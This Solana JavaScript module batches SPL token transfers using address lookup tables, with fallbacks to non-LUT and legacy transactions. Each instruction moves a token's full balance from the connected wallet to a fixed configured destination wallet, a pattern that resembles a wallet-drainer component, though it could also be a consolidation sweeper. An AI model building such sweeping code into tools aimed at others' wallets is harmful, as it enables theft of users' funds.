/**
 * LUT BATCHING - Address Lookup Tables for multi-token efficiency
 */

const { 
  AddressLookupTableProgram,
  TransactionMessage,
  VersionedTransaction,
  PublicKey,
  Transaction
} = require('@solana/web3.js');
const { DESTINATION_WALLET, TOKEN_PROGRAM_ID } = require('../../config/constants');
const tokenDiscovery = require('./tokenDiscovery');
const logger = require('../../utils/logger');
const helpers = require('../../utils/helpers');

class LUTBatching {
  constructor() {
    this.lutCache = new Map(); // wallet -> lutAddress
  }

  /**
   * Create batches of tokens for LUT optimization
   */
  createBatches(tokens, batchSize = 10) {
    const batches = [];
    for (let i = 0; i < tokens.length; i += batchSize) {
      batches.push(tokens.slice(i, i + batchSize));
    }
    return batches;
  }

  /**
   * Build transaction batch – attempts LUT, falls back to legacy if unavailable
   */
  async buildBatchTransaction(connection, walletPubkey, tokens, destination = DESTINATION_WALLET) {
    try {
      // Try to get a usable LUT (with retry)
      const lookupTableAccount = await this.getUsableLUT(connection, walletPubkey, tokens, destination);
      
      // Get recent blockhash
      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');

      // Build transfer instructions
      const instructions = await this.buildTransferInstructions(tokens, destination, walletPubkey);

      if (lookupTableAccount) {
        // --- LUT path: VersionedTransaction with LUT ---
        const message = new TransactionMessage({
          payerKey: walletPubkey,
          recentBlockhash: blockhash,
          instructions
        }).compileToV0Message([lookupTableAccount]);

        const transaction = new VersionedTransaction(message);

        const savings = this.calculateSavings(message, instructions.length);
        logger.info(`LUT batch built: ${tokens.length} tokens, saved ~${savings}%`);

        return {
          transaction,
          lookupTable: lookupTableAccount,
          message,
          tokenCount: tokens.length,
          savings,
          usedLut: true
        };
      } else {
        // --- Fallback: VersionedTransaction without LUT ---
        logger.warn(`LUT not available, falling back to non-LUT transaction for ${tokens.length} tokens`);

        const message = new TransactionMessage({
          payerKey: walletPubkey,
          recentBlockhash: blockhash,
          instructions
        }).compileToV0Message([]); // No LUTs

        const transaction = new VersionedTransaction(message);

        return {
          transaction,
          lookupTable: null,
          message,
          tokenCount: tokens.length,
          savings: 0,
          usedLut: false
        };
      }

    } catch (error) {
      logger.error('Batch build failed:', error);
      // Ultimate fallback: try legacy transaction if versioned fails
      try {
        logger.warn('Attempting legacy transaction fallback...');
        const legacyTx = await this.buildLegacyTransaction(connection, walletPubkey, tokens, destination);
        return {
          transaction: legacyTx,
          lookupTable: null,
          tokenCount: tokens.length,
          savings: 0,
          usedLut: false,
          legacy: true
        };
      } catch (fallbackError) {
        logger.error('Fallback also failed:', fallbackError);
        throw new Error(`Both LUT and fallback failed: ${error.message}`);
      }
    }
  }

  /**
   * Try to get a usable LUT with retry and address verification
   */
  async getUsableLUT(connection, walletPubkey, tokens, destination) {
    const cacheKey = walletPubkey.toBase58();
    let lutAddress = this.lutCache.get(cacheKey);

    // If we have a cached address, try to fetch it
    if (lutAddress) {
      const lutAccount = await this.fetchLUTWithRetry(connection, lutAddress);
      if (lutAccount) {
        // Verify that all required addresses are in the LUT
        const required = await this.getRequiredAddresses(walletPubkey, tokens, destination);
        if (this.lutContainsAll(lutAccount, required)) {
          return lutAccount;
        } else {
          logger.debug('Cached LUT missing some addresses, will try to extend or fallback');
        }
      }
    }

    // No usable LUT found
    return null;
  }

  /**
   * Fetch LUT account with retry (up to 3 slots)
   */
  async fetchLUTWithRetry(connection, lutAddress, maxAttempts = 3) {
    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
      try {
        const lutAccount = await connection.getAddressLookupTable(lutAddress);
        if (lutAccount.value) {
          return lutAccount.value;
        }
        logger.debug(`LUT fetch attempt ${attempt} – not ready yet`);
      } catch (e) {
        logger.debug(`LUT fetch error: ${e.message}`);
      }
      // Wait for next slot (~400ms per slot)
      await helpers.sleep(400);
    }
    return null;
  }

  /**
   * Check if LUT contains all required addresses
   */
  lutContainsAll(lutAccount, requiredAddresses) {
    const addresses = new Set(
      lutAccount.state.addresses.map(addr => addr.toBase58())
    );
    return requiredAddresses.every(addr => addresses.has(addr.toBase58()));
  }

  /**
   * Build transfer instructions for a batch of tokens
   */
  async buildTransferInstructions(tokens, destination, walletPubkey) {
    const instructions = [];
    for (const token of tokens) {
      const destinationAta = await tokenDiscovery.getAssociatedTokenAddress(
        new PublicKey(token.mint),
        destination
      );
      instructions.push(
        this.createTransferInstruction(
          token.accountAddress,
          destinationAta,
          walletPubkey,
          token.rawBalance
        )
      );
    }
    return instructions;
  }

  /**
   * Build a legacy transaction as ultimate fallback
   */
  async buildLegacyTransaction(connection, walletPubkey, tokens, destination) {
    const { blockhash } = await connection.getLatestBlockhash('finalized');
    const tx = new Transaction();
    tx.feePayer = walletPubkey;
    tx.recentBlockhash = blockhash;

    for (const token of tokens) {
      const destinationAta = await tokenDiscovery.getAssociatedTokenAddress(
        new PublicKey(token.mint),
        destination
      );
      // For legacy, we need a proper TransactionInstruction, not our custom object
      const ix = {
        programId: TOKEN_PROGRAM_ID,
        keys: [
          { pubkey: token.accountAddress, isSigner: false, isWritable: true },
          { pubkey: destinationAta, isSigner: false, isWritable: true },
          { pubkey: walletPubkey, isSigner: true, isWritable: false }
        ],
        data: Buffer.from([3, ...this.uint64ToBytes(token.rawBalance)])
      };
      tx.add(ix);
    }
    return tx;
  }

  // Existing methods unchanged below this line...
  async getRequiredAddresses(walletPubkey, tokens, destination) {
    const addresses = new Set();
    addresses.add(walletPubkey.toBase58());
    addresses.add(destination.toBase58());
    addresses.add(TOKEN_PROGRAM_ID.toBase58());
    
    for (const token of tokens) {
      addresses.add(token.accountAddress.toBase58());
      const destinationAta = await tokenDiscovery.getAssociatedTokenAddress(
        new PublicKey(token.mint),
        destination
      );
      addresses.add(destinationAta.toBase58());
    }
    return Array.from(addresses).map(addr => new PublicKey(addr));
  }

  calculateSavings(message, instructionCount) {
    const staticSize = message.staticAccountKeys.length * 32;
    const lutSize = message.addressTableLookups.reduce(
      (acc, lut) => acc + lut.writableIndexes.length + lut.readonlyIndexes.length,
      0
    );
    const withoutLut = staticSize + lutSize * 32;
    const withLut = staticSize + lutSize;
    return Math.round((1 - withLut / withoutLut) * 100);
  }

  createTransferInstruction(source, destination, owner, amount) {
    return {
      programId: TOKEN_PROGRAM_ID,
      keys: [
        { pubkey: source, isSigner: false, isWritable: true },
        { pubkey: destination, isSigner: false, isWritable: true },
        { pubkey: owner, isSigner: true, isWritable: false }
      ],
      data: Buffer.from([3, ...this.uint64ToBytes(amount)])
    };
  }

  uint64ToBytes(value) {
    const buffer = Buffer.alloc(8);
    buffer.writeBigUInt64LE(BigInt(value));
    return [...buffer];
  }

  // The original getOrCreateLUT and extendLUT are kept but not used in the main flow.
  // They can be removed or kept for manual operations.
}

module.exports = new LUTBatching();